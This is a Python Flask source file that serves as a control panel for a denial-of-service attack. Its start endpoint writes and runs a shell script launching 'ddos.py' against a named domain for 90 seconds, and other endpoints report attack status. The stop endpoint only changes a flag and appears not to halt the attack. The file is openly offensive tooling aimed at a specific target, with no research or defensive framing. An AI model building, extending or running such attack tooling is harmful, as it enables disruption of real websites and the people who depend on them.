from flask import Flask, jsonify
import subprocess
import threading
import fs
app = Flask(__name__)
# Globals
d_flag = False

def run_ddos_script():
    subprocess.run(['./start.sh'], shell=True)  

@app.route('/use/ddos/start/', methods=['POST'])
def start_ddos():
    global d_flag

    # Create the heading script.
    with open('start.sh', 'w') as file:  
        file.write('source myvenv/bin/activate\n')
        file.write('python3 ddos.py {} 90'.format('greyproject.studio'))         

    thread = threading.Thread(target=run_ddos_script)
    thread.start()  # Start the script in a separate thread
    d_flag = True
    return jsonify("DDoS script started in the background!")  


@app.route('/use/ddos/stop/', methods=['POST'])
def stop_ddos():
    global d_flag
    d_flag = False
    return jsonify("DDoS attack will stop in 10s")  



@app.route('/use/ddos/status/', methods=['GET'])
def ddos_status():
    global d_flag
    n = 200
    if not d_flag:
        n=201
    return jsonify(d_flag),n


if __name__ == '__main__':
    app.run(debug=True, port=7455) 
